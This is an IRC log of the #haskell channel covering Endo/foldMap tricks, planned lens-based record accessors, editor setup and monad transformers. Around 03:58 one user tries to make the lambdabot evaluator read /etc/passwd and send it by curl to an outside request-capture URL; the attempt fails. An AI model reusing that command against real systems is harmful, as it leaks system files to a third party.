00:00:39 <yitz> @pl  (appEndo $ (Endo (+1)) <> (Endo (+2))) 1
00:00:43 <lambdabot> (appEndo $ Endo (+ 1) <> Endo (+ 2)) 1
00:00:43 <lambdabot> optimization suspended, use @pl-resume to continue.
00:00:51 <yitz> @pl  (appEndo $ (Endo (+1)) <> (Endo (+2)))
00:00:54 <lambdabot> appEndo $ Endo (+ 1) <> Endo (+ 2)
00:00:55 <lambdabot> optimization suspended, use @pl-resume to continue.
00:01:02 <ReinH> yitz: it's already pointless. :)
00:01:12 <yitz> ReinH: hmm. yeah.
00:01:18 <ReinH> in more way than one
00:02:26 <ReinH> Well, you can:
00:02:27 <ReinH> > let f = ala Endo foldMap [(+1), (+2), (*4)] in f 6 :: Int
00:02:28 <elliott> yitz: hm?
00:02:29 <lambdabot>   27
00:02:36 <ReinH> that's not so bad
00:02:46 <ReinH> it's the applying it that is troublesome without a binding
00:03:39 <haasn> > comparing length "ala Endo foldMap" "foldr (.) id"
00:03:40 <lambdabot>   GT
00:03:52 <ReinH> lambdabot: shhhh
00:03:58 <ReinH> er
00:04:00 <ReinH> haasn: shhhhh
00:04:06 <ReinH> I just wanted to use Endo ok? :p
00:06:44 <haasn> it's okay, I did that too :) then spent ages trying to come up with a shorter solution that isn't blatantly obvious
00:07:20 <ReinH> haasn: I'm aware that <> = (.) and mempty = id :p
00:07:29 <haasn> lens could use a helper for ‘ala ?? foldMap’ or ‘au ?? foldMap’ ;)
00:07:44 <haasn> edwardk: ^
00:07:46 <ReinH> foldAla? foldAu?
00:07:59 <ReinH> the second one makes me think I LIKE GOOOLD though
00:08:01 <edwardk> its dangerously close to the fairbairn threshold for me
00:08:31 <edwardk> e.g. the lensy version would be more likely ala ?? foldMapOf l
00:08:42 <ReinH> foldOver?
00:08:45 <haasn> sure why not
00:08:47 <ReinH> then you just need to add turnOver
00:08:53 <haasn> re: edwardk
00:08:59 <ReinH> and overEasy
00:09:07 <ReinH> and your over-related puns will be complete
00:09:13 <haasn> overUsed
00:09:16 <ReinH> confirm
00:09:18 <edwardk> well, we're already looking at adding 'over exposed'
00:09:59 <edwardk> but that'll work a lot better after the record system improvements
00:11:12 <ReinH> edwardk: go on
00:11:58 <haasn> > comparing length "foldAla Sum folded" "ala Sum foldMap"
00:11:59 <lambdabot>   GT
00:12:05 <haasn> > comparing length "foldAla Sum each" "ala Sum foldMap"
00:12:07 <lambdabot>   GT
00:12:29 <haasn> still beats having to import foldMap :)
00:12:35 <ReinH> heh
00:12:42 <ReinH> hey I like foldMap
00:12:54 <ReinH> it's really good for folding and mapping things at the same time.
00:13:02 <edwardk> ReinH: 'exposed' is an isomorphism from a type to a copy of the type with all the type variables cloned for each field.   e.g. it'd take data Pair a = Pair a a   to data ExposedPair a b = ExposedPair a b
00:13:24 <ReinH> edwardk: alrighty
00:13:30 <ReinH> edwardk: and why would you want this?
00:13:31 <edwardk> ReinH: then we'd want ExposedPair to offer the same lnes field names as the original.
00:13:45 <haasn> over exposed $ _1 .~ show >>> _2 .~ show
00:14:11 <haasn> -- lets you change the type of fields independently even if they're normally related
00:14:18 <edwardk> Pair "hello" "world" & exposed %~ \r -> r & _1 %~ length & _2 %~ length
00:14:24 <edwardk> it lets you 'cross a chasm in two jumps'
00:14:30 <haasn> as long as they match again with the result it doesn't matter what the ExposedPair's types look like in the intermediate stages
00:14:37 <edwardk> eventually solving the multi-field record update problem.
00:16:15 <haasn> how long until record syntax is just sugar for lens operators (which will be in base by then, obviously)?
00:16:33 <edwardk> haasn: gundry's doing that now
00:16:41 <edwardk> haasn: so probably 7.10
00:16:52 <edwardk> seriously =P
00:17:13 <ibotty> seriously seriously?
00:17:23 <ibotty> wow
00:17:51 <edwardk> ibotty: well, its a bit facetious in that i'm slightly over stating the case
00:18:37 <edwardk> ibotty: what we're getting is that field accessors will be polymorphically usable as some more complicated things. morally, its equivalent to saying we'll have a few classes that look something like:
00:18:56 <haasn> oh that
00:19:10 <haasn> right one thing we wouldn't exactly want to break backwards compatibility with is using field accessors as regular functions
00:19:14 <haasn> without the use of ‘view’ :)
00:19:18 <haasn> that would destroy so much code
00:22:08 <edwardk> class Get (x :: Symbol) s a | s x -> a where get :: Proxy x -> s -> a
00:22:28 <edwardk> class Set :: (x :: Symbol) s t b | x s b -> t where set :: Proxy x -> s -> b -> t
00:22:39 <edwardk> class Accessor p where accessor :: (Get x s a, Set x s a a) => Proxy x -> (forall b t. Set x s b t => s -> b -> t) -> p s a  -- that is from memory and probably wrong
00:22:59 <elliott> edwardk: "P"roxy?
00:23:07 <edwardk> lowercase the proxies =)
00:23:57 <haasn> edwardk hates data types with many type variables. He moves them to type synonyms and MTPCs instead
00:24:19 <ibotty> lowercase all the proxies :D.  edwardk: so that i understand: any existing data type will magically get lenses?
00:24:22 <edwardk> then a field name 'foo' desugars to accessor (Proxy :: Proxy "foo") (set (Proxy :: Proxy "foo"))     -- or something similar
00:24:30 <ibotty> k
00:24:46 <ibotty> that's great!
00:24:51 <ReinH> haasn: also I still have to figure out how the Endo monoid forms a monad, but that's for another time :)
00:25:00 <edwardk> ibotty: what happens is every field accessor will be usable as a function like it is now, with some work libraries like data-lens, fclabels, accessors, can all make instances that will let them be usable directly as those types of lenses
00:25:01 <haasn> oh, I didn't know this thing used Symbol
00:25:03 <haasn> that's neat
00:25:14 <edwardk> and lens itself will be able to make a combinator to convert a field accessor into a full type-changing lens
00:25:16 <haasn> so we actually get fully overloaded records and stuff (as long as they're still statically checkable)?
00:25:51 <edwardk> haasn: yeah basically the record type inference flows from record type to field type unidirectionally
00:26:48 <edwardk> then you can have foo . bar     be either field composition using functions, or data-lens, etc. style lens composition, and you can lift them into lenses  with whatever the heck the combinator gets called
00:27:12 <elliott> it's time for lens's first single-letter combinator.
00:27:12 <edwardk> lets say for sake of discussion 'le'    le bar . le foo   or __ bar . __ foo  or something
00:27:19 <edwardk> elliott: more or less
00:27:28 <edwardk> elliott: i'm somewhat inclined towards the evil __ =)
00:27:37 <elliott> it looks kinda big. visually.
00:27:39 <Taneb> Is that even a valid identifier?
00:27:41 <edwardk> yeah
00:27:46 <edwardk> > let __ = 4 in __
00:27:47 <elliott> like, I'd still want to derive lenses with short names if I had to say that.
00:27:48 <lambdabot>   4
00:27:54 <edwardk> elliott: yeah
00:27:55 <Taneb> :O
00:28:12 <elliott> how about "ii"? it doesn't mean anything, it just looks kinda nice.
00:28:14 <edwardk> elliott: well, you still want the deriving of lenses because they give you classy lenses to access deep structures without complicated looking lens chains
00:28:14 <elliott> ii bar . ii foo
00:28:19 <haasn> a?
00:28:27 <Taneb> byorgey, you about?
00:28:51 <haasn> ReinH: what do you mean by ‘forms a monad’?
00:29:10 <edwardk> i've been using 'le' in my experiments just because it is short for lens and it makes the 12 year old in me giggle about rage comics
00:29:27 <haasn> :(
00:29:38 <ReinH> haasn: a monad is a monoid in the category of endofunctors, right?
00:29:41 <ReinH> I mean, obvously, right? ;)
00:29:44 <ReinH> edwardk: sigh
00:30:19 <ReinH> Someone needs to write Categories for the Working Haskeller.
00:30:21 <johnw> ReinH: the Endo monoid is not an object in the category of endofunctors
00:30:26 <ibotty> i like `le`. it is similar to haasn's a, semantically
00:30:52 <haasn> ‘la’
00:30:57 <haasn> provides a bit of symmetry
00:30:59 <haasn> to the overuse of le
00:31:33 <haasn> ReinH: oh! I finally got it
00:31:36 <ibotty> right. but what about `el` or `il`, `das`
00:31:45 <ibotty> :D
00:31:59 <haasn> ReinH: the missing link was ‘Endo’ <-> ‘endo’functor
00:32:13 <haasn> das is too long
00:32:25 <haasn> how about ‘lo’
00:32:34 <ibotty> `un` (or `une`)  would be great as well. just listen to that example:
00:32:34 <ibotty> un list . un first
00:32:39 <ibotty> :D
00:32:48 <ibotty> lo is great as well
00:32:52 <ReinH> johnw: fail joke was fail :(
00:32:55 <haasn> isn't lo what lojban uses here?
00:33:09 <johnw> ReinH: ah, haha
00:35:08 <adnap> Can I write a sequential program that loops forever doing: Read input into buffer. Check if buffer contains newline. If buffer contains newline, append the contexts of the buffer preceding the newline to a list and discard the newline. Output the contents of the list.
00:35:45 <ibotty> can haskell do that?
00:35:55 <ibotty> aww. i thought lambdabot would answer...
00:35:56 <adnap> I guess that if the program is doing something other than reading input when a character is typed, it will be ignored.
00:36:33 <adnap> It seems like getLine blocks no matter what buffering mode I use for stdin
00:36:41 <merijn> adnap: Well, yes
00:36:51 <merijn> adnap: It blocks until you get a new line...
00:37:06 <merijn> It will just spinloop if you disable buffering
00:37:21 <adnap> I want to read a character if one has been typed, and move on otherwise
00:37:37 <merijn> What does "move on" mean?
00:37:50 <adnap> merijn: Proceed to the next item in "forever doing..."
00:37:52 <blackdog> adnap: you might be better off just forking a new process for each independent thing you want to do
00:37:59 <adnap> blackdog: I know
00:38:10 <adnap> I just want to know how to write this sequential program
00:39:11 <adnap> Perhaps there is no way to "try to read a character and process to the next IO action if nothing is immediately typed"
00:39:18 <adnap> *proceed
00:39:53 <blackdog> http://stackoverflow.com/questions/3894792/what-is-a-simple-way-to-wait-for-and-then-detect-keypresses-in-haskell maybe?
00:40:58 <ReinH> adnap: http://chimera.labs.oreilly.com/books/1230000000929/ch09.html#sec_async-exceptions
00:41:00 <adnap> What I want is kind of what a threaded program would do. A thread that reads input would give control to another thread if it didn't read anything in a certain amount of time.
00:41:15 <ReinH> adnap: you can cancel the IO action thread with a timeout
00:41:34 <adnap> ReinH: Oh, I'm reading this book right now
00:58:06 <adnap> omg
00:58:27 * adnap wonders why no one told him about :sprint when explaining evaluation in Haskell
01:04:16 <haasn> http://bpaste.net/show/127354/ why does this show foo = 'h' : _  and not foo = _ : _ ? I thought only the outer constructor would get forced
01:14:11 <akegalj> so.. lets say i have "data User = User {name :: Maybe String, age :: Maybe Int}. How to partly apply User constructor with "Just" on fields. So i want to partly apply Just on fields of User so after i could do 'partlyJustOnUser "John" 30' ?
01:15:00 <valyagolev> somebody, answer haasn – I'm interested as well:)
01:16:47 <haasn> akegalj: User `on` Just
01:16:54 <valyagolev> @type on
01:16:55 <lambdabot> (b -> b -> c) -> (a -> b) -> a -> a -> c
01:17:07 <haasn> oh, that's monomorphic
01:17:28 <haasn> User $:: Just ~> Just ~> id -- hehe
01:17:45 <valyagolev> @hoogle (Maybe a -> Maybe b -> c) -> (a -> b -> c)
01:17:45 <lambdabot> No results found
01:17:58 <akegalj> haasn: oh... interesting
01:18:00 <valyagolev> @type (~>)
01:18:01 <lambdabot>     Not in scope: `~>'
01:18:01 <lambdabot>     Perhaps you meant one of these:
01:18:01 <lambdabot>       `>>' (imported from Control.Monad.Writer),
01:18:11 <valyagolev> @type (Control.Applicative.~>)
01:18:12 <lambdabot>     Not in scope: `Control.Applicative.~>'
01:18:12 <lambdabot>     Perhaps you meant one of these:
01:18:12 <lambdabot>       `Control.Applicative.*>' (imported from Control.Applicative),
01:18:13 <haasn> valyagolev: "pointless-fun" Data.Function.Pointless
01:18:25 <valyagolev> @type (Data.Function.~>)
01:18:26 <lambdabot>     Not in scope: `Data.Function.~>'
01:18:26 <lambdabot>     Perhaps you meant one of these:
01:18:26 <lambdabot>       `Data.Function.$' (imported from Data.Function),
01:18:45 <haasn> (~>) :: (a -> b) -> (c -> d) -> (b -> c) -> a -> d
01:19:11 <valyagolev> :)
01:24:10 <akegalj> haasn, valyagolev: i didnt get it now. Is there (~>) defined somewhere?
01:24:31 <ibotty> http://hackage.haskell.org/packages/archive/pointless-fun/1.1.0.1/doc/html/Data-Function-Pointless.html
01:25:01 <akegalj> ibotty: thnx
01:25:17 <haasn> secretly my favorite module ever
01:26:05 <akegalj> haasn: :)
01:38:10 <mstksg> is there a way to check if a value matches a given type returning a bool inline, without a case statement?
01:38:26 <mstksg> or not even a given type, just a given pattern in general
01:38:35 <mstksg> kind of like a generalized isJust
01:38:51 <xenocons> :t (~>)
01:38:52 <lambdabot>     Not in scope: `~>'
01:38:52 <lambdabot>     Perhaps you meant one of these:
01:38:52 <lambdabot>       `>>' (imported from Control.Monad.Writer),
01:38:57 <xenocons> naw
01:42:47 <valyagolev> @type (Data.Function.Pointless.~>)
01:42:48 <lambdabot> Couldn't find qualified module.
02:25:23 <t7> whats the quickest way to factor primes on a classical computer?
02:25:24 <lpaste> theredguy pasted “Return type for this function” at http://lpaste.net/92272
02:26:16 <fylwind> sieve algorithm perhaps?
02:26:43 <ibotty> function field sieves i guess
02:27:09 <ibotty> it's active research so you might have to look into papers
02:27:38 <fylwind> so is it just me or a lot of haskell libraries tend to prefer Strings over Text
02:28:09 <arkeet> t7: factoring primes?
02:28:11 <ibotty> i'm a noob myself, but text is older and not in base. i guess that's a good reason
02:28:13 <arkeet> that's easy.
02:28:24 <ibotty> arkeet: :D
02:28:27 <arkeet> in fact, I know of an O(1) algorithm for it.
02:28:36 <ibotty> _into_ i guess
02:28:41 <arkeet> ;)
02:28:55 <ibotty> your algorithm has pretty good constants as well
02:29:04 <arkeet> yes
02:29:08 <arkeet> such as 0
02:29:13 <ibotty> nah
02:29:19 <ibotty> function call overhead
02:29:20 <elliott> um, Text is newer than String.
02:29:23 <arkeet> oh, fine.
02:29:25 <ibotty> maybe not with ghc though
02:29:26 <t7> arkeet: i mean factoring prime * prime
02:29:29 <arkeet> but the compiler will optimize it away anyway.
02:29:31 <arkeet> heh.
02:29:35 <fylwind> i'm writing a parser and primarily using lazy Text but I'm not sure if I made the right choice ... I find that 15% of my code just consists of (un)packing strings and gets a little obnoxious after a while
02:29:44 <elliott> something like two decades newer :P
02:29:58 <arkeet> fylwind: what kind of parser?
02:30:12 <fylwind> text document parser
02:30:18 <arkeet> are you using a parser library>
02:30:20 <arkeet> ?
02:30:21 <fylwind> Parsec
02:30:26 <ibotty> arkeet: do you know p*p' = num with p and p' prime?
02:30:27 <arkeet> ok.
02:30:36 <arkeet> ibotty: ?
02:30:44 <arkeet> yes, I'm pretty sure the product of two primes is a number.
02:30:57 <fylwind> harhar
02:31:09 <elliott> it would be interesting if that was untrue.
02:31:12 <fylwind> i just think it would be nice if I don't have to write (pack "myliteral") every time
02:31:22 <arkeet> fylwind: oh, have you heard of OverloadedStrings?
02:31:22 <ibotty> do you want to factorize a number into its primes or do you know its (within reasonable doubt) the product of two primes
02:31:32 <fylwind> what's that about?
02:31:42 <arkeet> fylwind: it lets you avoid writing pack.
02:32:01 <ibotty> elliott: no. it wouldn't be interesting. it would be very boring, because you just wouldn't use multiplication..,
02:33:47 <elliott> ibotty: that's an odd perspective.
02:33:53 <elliott> I think multiplication turning out to be partial would be very interesting.
02:34:21 <ibotty> would it? i mean, wouldn't you just make a field extension and work in that new field?
02:34:23 <elliott> it would have wide-ranging consequences, for instance the inconsistency of a bunch of formal systems.
02:34:25 <arkeet> fylwind: OverloadedStrings was invented precisely for this reason.
02:34:41 <ibotty> (well, field extension of course not, because multiplication has to be closed in a field, but you get my point)
02:34:44 <fylwind> arkeet: that's pretty neat! thanks
02:38:33 <fylwind> do people actually use UnicodeSyntax? :)
02:39:36 <ibotty> i moved on, when i switched to vim2hs, which displays unicode chars when i'm not in that line
02:43:40 <merijn> fylwind: not really
02:43:59 <merijn> fylwind: Occasionally in papers/blogposts, but not for real code
02:44:03 <fylwind> figured it would be quite a pain to type
02:44:06 <ibotty> maybe they do in non-english-speaking communities?
02:45:15 <fylwind> exotic unicode characters tend to screw up the alignment of the code due to lack of glyphs in the monospaced fonts
02:45:22 <arkeet> I tried the showing unicode in vim thing once
02:45:24 <arkeet> I didn't really lik eit
02:45:30 <elliott> one prolific package author uses UnicodeSyntax
02:45:34 <elliott> but I forget the name.
02:45:36 <elliott> but I always notice it.
02:45:54 <arkeet> I know who you mean. but I forget the name.
02:46:06 <fylwind> man, so much for asking who it was :/
02:46:15 <elliott> I can find out.
02:46:26 <arkeet> or any packages that use it, for that matter.
02:46:27 <ibotty> grep ?
02:46:30 <elliott> it is Bas van Dijk.
02:47:46 <fylwind> github's syntax highlighter apparently rejects those unicode chars
02:48:49 <ibotty> arkeet: http://i.imgur.com/P8mjvjG.png
02:48:59 <arkeet> I know.
02:49:04 <arkeet> I didn't like it.
02:49:20 <fylwind> the lambda kinda melds with the name
02:49:33 <ibotty> as is the \
02:49:51 <fylwind> which is why i prefer writing "\ x -> x" instead of "\x -> x" :)
02:50:32 <ibotty> in my font (terminus), \ looks the same as λ
02:50:45 <ibotty> at least on the left side of the bar
02:51:21 <ibotty> and with a space it looks spacey as well. but anyway.
02:51:47 <arkeet> well, a good colour scheme would avoid that trouble.
02:52:24 <arkeet> in this font \ appears as a yen symbol :/
02:52:31 <ibotty> well it is a different color with the vim2hs syntax highlighting (assuming you have a vim colorscheme)
02:52:52 <ibotty> try to find a good font! :D
02:53:05 <arkeet> try to find a good font with good japanese support, yes
02:57:07 <fylwind> regarding how to split up a project, are haskell modules generally fairly small?
02:57:28 <fylwind> that is, do people prefer to have many small modules rather than a few big ones?
03:11:17 <donri> fylwind: i would say people prefer topic-oriented modules and a top module that re-exports most of them
03:11:47 <donri> depends on the package though
03:12:00 <donri> and how you define 'topic' :)
03:29:02 <adnap> @define bleh x = x
03:29:03 <lambdabot>  Defined.
03:29:07 <adnap> > bleh 2
03:29:13 <lambdabot>   2
03:29:59 <valyagolev> what's up with presentations about haskell and comic sans
03:30:35 <adnap> Hm...
03:30:48 <adnap> @let x = 2 + 3
03:30:49 <haasn> the same that's up with presentations and comic sans, I guess
03:30:50 <lambdabot>  Defined.
03:30:55 <adnap> :sprint x
03:31:09 <adnap> @print x
03:31:10 <lambdabot> Not enough privileges
03:31:14 <adnap> Okay
03:31:26 <adnap> @help
03:31:26 <lambdabot> help <command>. Ask for help for <command>. Try 'list' for all commands
03:31:35 <adnap> @list
03:31:35 <lambdabot> What module?  Try @listmodules for some ideas.
03:31:39 <adnap> @help list
03:31:39 <lambdabot> list [module|command]. Show commands for [module] or the module providing [command].
03:31:55 * adnap goes away
03:31:59 <mr-> hehe
03:32:11 <mr-> @listmodules
03:32:11 <lambdabot> activity base bf check compose dice dict djinn dummy elite eval filter free fresh haddock help hoogle instances irc karma localtime more oeis offlineRC pl pointful poll pretty quote search slap
03:32:11 <lambdabot> source spell system tell ticker todo topic type undo unlambda unmtl version where
03:32:24 <donri> valyagolev: http://www.reddit.com/r/haskell/comments/1bd1ia/spj_and_comic_sans/
03:33:00 <valyagolev> donri :)
03:41:05 <darthdeus> hey guys, anyone got a good vim mode for haskell? i'm using this https://github.com/lukerandall/haskellmode-vim but it has an almost non-existent syntax highlighting
03:41:11 <adnap> So, is doing an "@undefine" in herea disaster?
03:41:26 <donri> darthdeus: vim2hs :)
03:41:36 <elliott> @undefine
03:41:36 <lambdabot> Undefined.
03:41:44 * elliott looks around for a disaster.
03:41:47 <darthdeus> donri: thanks! i'll check it out
03:41:54 <adnap> elliott: OMG! What about all the important stuff people defined?
03:42:00 <darthdeus> that haskellmode-vim drove me so crazy i even downloaded emacs again ...
03:42:08 <haasn> elliott just set mathematics back 50 years
03:42:15 * adnap giggles
03:42:18 <haasn> please don't cause any more harm
03:42:26 <adnap> I will rebuild it...
03:42:32 <haasn> and take all the credit
03:42:35 <haasn> brilliant
03:42:36 <adnap> @let Foo = Yes | No deriving Show
03:42:36 <lambdabot>  Parse failed: Parse error: |
03:42:41 <adnap> @let data Foo = Yes | No deriving Show
03:42:42 <lambdabot>  Defined.
03:42:48 <valyagolev> @define disaster = fix (+1)
03:42:49 <lambdabot>  Defined.
03:42:53 <adnap> @let f :: Foo -> Foo; f Yes = No; f No = Yes
03:42:54 <donri> darthdeus: vim2hs for syntax highlighting mostly; for integration you want syntastic, hdevtools, neco-ghc
03:42:54 <lambdabot>  Defined.
03:42:58 <adnap> > f Yes
03:42:59 <lambdabot>   Ambiguous occurrence `f'
03:42:59 <lambdabot>  It could refer to either `L.f', defined at L.hs:1...
03:43:10 <adnap> Huh?
03:43:14 <darthdeus> donri: yay it works great :)
03:43:15 <adnap> :t L.f
03:43:15 <lambdabot> Foo -> Foo
03:43:21 <adnap> Oh...
03:43:30 <adnap> How do I see more?
03:43:38 <haasn> via /msg lambdabot presumably
03:43:38 <adnap> either `L.f' or...
03:43:47 <adnap> > L.f Yes
03:43:51 <lambdabot>   No
03:44:00 <haasn> .. or `Debug.SimpleReflect.Vars.f'
03:44:09 <haasn> lambdabot is more verbose in private queries
03:44:22 <adnap> I see...
03:44:28 <adnap> I wonder what it's doing
03:44:37 <donri> darthdeus: optionally ghcmod-vim as well; it's slower than vim-hdevtools and requires compining vimproc, but has some more features like expanding TH splices
03:44:38 <adnap> I don't understand why it makes two definitions
03:44:41 <haasn> @undefine
03:44:41 <lambdabot> Undefined.
03:44:45 <haasn> > foldr f [x,y,z] :: [Expr]
03:44:46 <lambdabot>   Couldn't match expected type `[Debug.SimpleReflect.Expr.Expr]'
03:44:47 <lambdabot>             ...
03:44:47 <haasn> err
03:44:50 <haasn> > map f [x,y,z] :: [Expr]
03:44:51 <lambdabot>   [f x,f y,f z]
03:45:00 <elliott> you don't need the disambig
03:45:03 <elliott> because x,y,z :: Expr
03:45:10 <darthdeus> donri: oh i just started learning haskell about a week ago, i think syntastic will be good enough for a while for me :))
03:45:11 <haasn> > map f [x,y,z]
03:45:12 <lambdabot>   No instance for (Debug.SimpleReflect.Expr.FromExpr b0)
03:45:12 <lambdabot>    arising from a us...
03:45:18 <darthdeus> but i'll check em out
03:45:48 <elliott> well, I meant for foldr.
03:45:49 <donri> darthdeus: vim-hdevtools with -fdefer-type-errors is probably great for a beginner. it lets you inspect types of local subexpressions "live"
03:45:51 <haasn> oh
03:45:52 <elliott> > foldr f z [a,b,c]
03:45:53 <lambdabot>   f a (f b (f c z))
03:45:55 <haasn> yes
03:46:00 <adnap> Whoa, what
03:46:02 <haasn> I really meant map, though :)
03:46:09 <elliott> you meant wrong
03:46:16 <adnap> > flip (x, y)
03:46:17 <lambdabot>   Couldn't match expected type `a0 -> b0 -> c0'
03:46:17 <lambdabot>              with actual type...
03:46:36 <haasn> > swap (x, y)
03:46:36 <adnap> > flip (x, y) :: (Expr, Expr)
03:46:37 <lambdabot>   (y,x)
03:46:37 <lambdabot>   can't find file: L.hs
03:46:39 <adnap> Er
03:46:41 <adnap> Yeah
03:47:01 <valyagolev> that smells like lisp
03:47:24 <adnap> > map (+1) [x,y,z]
03:47:25 <lambdabot>   [x + 1,y + 1,z + 1]
03:47:44 <valyagolev> > map (-1) $ map (+1) [x,y,z]
03:47:45 <lambdabot>   No instance for (GHC.Show.Show b0)
03:47:46 <lambdabot>    arising from a use of `M363204528.sho...
03:47:54 <valyagolev> > map (-1) $ map (+1) [x,y,z] :: [Expr]
03:47:55 <lambdabot>   No instance for (GHC.Num.Num
03:47:55 <lambdabot>                     (Debug.SimpleReflect.Expr....
03:48:32 <darthdeus> donri: wow that type inspection really works
03:48:37 <adnap> :t force
03:48:37 <lambdabot> Not in scope: `force'
03:48:41 <donri> darthdeus: :)
03:48:45 <darthdeus> donri: with :HdevtoolsType
03:48:50 <valyagolev> what am I doing wrong;(
03:48:55 <adnap> :t deepseq
03:48:55 <darthdeus> i'm amazed
03:48:56 <lambdabot> Not in scope: `deepseq'
03:49:09 <donri> darthdeus: i suggest mapping it to some keys (and the :HdevtoolsClear command as well) and configuring it to use -fdefer-type-errors if you have ghc 7.6
03:49:29 <donri> darthdeus: then you can even inspect types of code that doesn't type check!
03:49:29 <adnap> So, why does lambdabot create two defintions when you define something?
03:49:31 <supki> > map (subtract 1) $ map (+1) [x, y, z]
03:49:32 <lambdabot>   [x + 1 - 1,y + 1 - 1,z + 1 - 1]
03:49:38 <valyagolev> duh
03:49:44 <valyagolev> always forget about -
03:49:50 <haasn> adnap: she doesn't. That one was already in scope
03:49:52 <valyagolev> > map (1-) $ map (1+) [x,y,z] :: [Expr]
03:49:53 <lambdabot>   [1 - (1 + x),1 - (1 + y),1 - (1 + z)]
03:50:06 <adnap> @let wombat x = x + 1
03:50:07 <lambdabot>  Defined.
03:50:07 <valyagolev> > map (1:) $ map (2:) [x,y,z] :: [Expr]
03:50:08 <lambdabot>   Couldn't match expected type `[a0]'
03:50:08 <lambdabot>              with actual type `Debug.Si...
03:50:10 <adnap> > wombat 5
03:50:13 <lambdabot>   6
03:50:22 <valyagolev> > map (1:) [xs]
03:50:24 <lambdabot>   Not in scope: `xs'
03:50:24 <lambdabot>  Perhaps you meant one of these:
03:50:24 <lambdabot>    `x' (imported from D...
03:50:41 <darthdeus> donri: in g:hdevtools_options  ?
03:50:52 <adnap> @let data WooWah = Hehoo | Blerk
03:50:53 <lambdabot>  Defined.
03:50:55 <donri> darthdeus: yes, '-g -fdefer-type-errors'
03:51:06 <valyagolev> >1:
03:51:09 <valyagolev> > 1:x
03:51:10 <lambdabot>   Couldn't match expected type `[a0]'
03:51:10 <lambdabot>              with actual type `Debug.Si...
03:51:21 <adnap> @let snorf Blerk = Hehoo
03:51:22 <lambdabot>  Defined.
03:51:26 <adnap> > snorf Blerk
03:51:28 <lambdabot>   No instance for (GHC.Show.Show L.WooWah)
03:51:28 <lambdabot>    arising from a use of `M2591968...
03:52:06 <valyagolev> > expr (2 : 3 : [])
03:52:07 <lambdabot>   Couldn't match expected type `Debug.SimpleReflect.Expr.Expr'
03:52:07 <lambdabot>              w...
03:52:34 <valyagolev> >  there are no options for manipulating the reflected expressions beyond showing them
03:52:35 <lambdabot>   Not in scope: `there'Not in scope: `are'
03:52:35 <lambdabot>  Perhaps you meant one of these:
03:52:35 <lambdabot>  ...
03:52:41 <adnap> @let data Dinglehopper = Dinglehopper deriving Show
03:52:42 <lambdabot>  Defined.
03:52:46 <adnap> > Dinglehopper
03:52:49 <lambdabot>   Dinglehopper
03:53:20 <darthdeus> donri: syntastic doesn't seem to be working though, it doesn't highlight any error, even though it works for me in other languages
03:54:22 <valyagolev> > unsafePerformIO $ print "hey"
03:54:23 <lambdabot>   Not in scope: `unsafePerformIO'
03:54:35 <valyagolev> > System.IO.Unsafe.unsafePerformIO $ print "hey"
03:54:36 <lambdabot>   Not in scope: `System.IO.Unsafe.unsafePerformIO'
03:55:02 <adnap> > print "hey"
03:55:03 <lambdabot>   <IO ()>
03:55:21 <donri> darthdeus: may need to update it to use hdevtools. or install ghc-mod, but hdevtools is faster
03:55:26 <adnap> > putStrLn "hey"
03:55:27 <lambdabot>   <IO ()>
03:55:30 <adnap> That seems new
03:55:30 <valyagolev> > readFile "/etc/passwd"
03:55:31 <lambdabot>   <IO [Char]>
03:55:39 <adnap> O_O
03:55:44 <donri> @hackage show
03:55:45 <lambdabot> http://hackage.haskell.org/package/show
03:56:18 <donri> > show show
03:56:19 <lambdabot>   "<() -> [Char]>"
03:56:32 <adnap> > do { print "hey" }
03:56:33 <lambdabot>   <IO ()>
03:56:57 * hackagebot approx-rand-test 0.2.0 - Approximate randomization test  http://hackage.haskell.org/package/approx-rand-test-0.2.0 (DanielDeKok)
03:58:07 <valyagolev> > readFile "/etc/passwd" >>= \pw -> readProcess ["curl http://requestb.in/uhk7bhuh?" ++ pw] [] []
03:58:08 <lambdabot>   Not in scope: `readProcess'
03:59:00 <donri> it doesn't actually run IO, it's just Show with Typeable
03:59:01 <valyagolev> whatever
03:59:13 <valyagolev> yeah, I got it, but still wanted to try:)
03:59:30 <adnap> > seq (print "hey") (return ())
03:59:31 <lambdabot>   No instance for (GHC.Show.Show (m0 ()))
03:59:31 <lambdabot>    arising from a use of `M85633574...
03:59:50 <valyagolev> print "hey" >> return ()
03:59:57 <valyagolev> > print "hey" >> return ()
03:59:58 <lambdabot>   <IO ()>
04:00:32 <valyagolev> is there something like simple-reflect but more powerful?
04:01:28 <haasn> more powerful?
04:01:38 <donri> complex-reflect? :p
04:01:54 <valyagolev> :D
04:02:04 <valyagolev> simple-reflect:  The primary aim of this package is teaching and understanding; there are no options for manipulating the reflected expressions beyond showing them.
04:02:08 <haasn> simple-refract
04:02:29 <darthdeus> donri: still doens't pickup anything :\ crap, i'll try the other one thwn
04:02:31 <valyagolev> maybe something with such options
04:02:32 <darthdeus> then*
04:03:22 <donri> darthdeus: i also have this in my vimrc, but don't think it should be required:  let g:syntastic_haskell_checkers = ['hdevtools', 'hlint']
04:03:52 <Kaini> (Windows) I managed to build HsOpenSSL using http://slproweb.com/products/Win32OpenSSL.html (and subsequently openssl-streams and http-streams) unfortunately my test program segfaults. Any ideas?
04:04:01 <darthdeus> donri: yeah that's it! now it works :)
04:04:07 <darthdeus> i guess it doesn't have a default for hdevtools then
04:04:40 <donri> darthdeus: ah. i thought it just included all installed by default
04:10:20 <danilo2> Hello! I've got a question to you :) If I'm writing a code generator and I've got some pure functions generating the code and I want to log some warnings to the user (using hslogger), should I pack every such generating function into IO Monad or it would be nice to use unsafePerformanceIO here?
04:11:43 <ibotty> how can i derive Enum for a simple sum type of Bounded Enum types?
04:12:15 <ibotty> i.e.: data A = A1 | A2 deriving (Enum, Bounded)
04:12:30 <ibotty> data S = S A A
04:12:57 <ibotty> i cannot easily derive Enum, although it should be, somehow...
04:17:02 <mbrock> danilo2: if you don't otherwise need IO, the Writer monad might do the trick
04:18:56 <haasn> Writer (DList String) -- is what I use for logging
04:19:34 <danilo2> mbrock: Thank you - I'll try it. Could I ask you for one more thing? I'm new to monadic transformations and I'm feeling I'm slowly grasping this idea - Could I ask you for an example code of connecting StateT with Writer monad? (If this of course is short code and will not take you much time) :)
04:20:39 <danilo2> this coudl be of course IO instead of writer - If its possible
04:21:30 <donri> > runWriterT (runStateT 0 (do n <- get; lift (tell "incrementing"); put (succ n)))
04:21:31 <lambdabot>   No instance for (GHC.Num.Num
04:21:31 <lambdabot>                     (Control.Monad.Trans.State...
04:22:18 <danilo2> donri: thank you! checking it right now :)
04:22:39 <danilo2> What is the advantage of using writer monad instead of IO in this case?
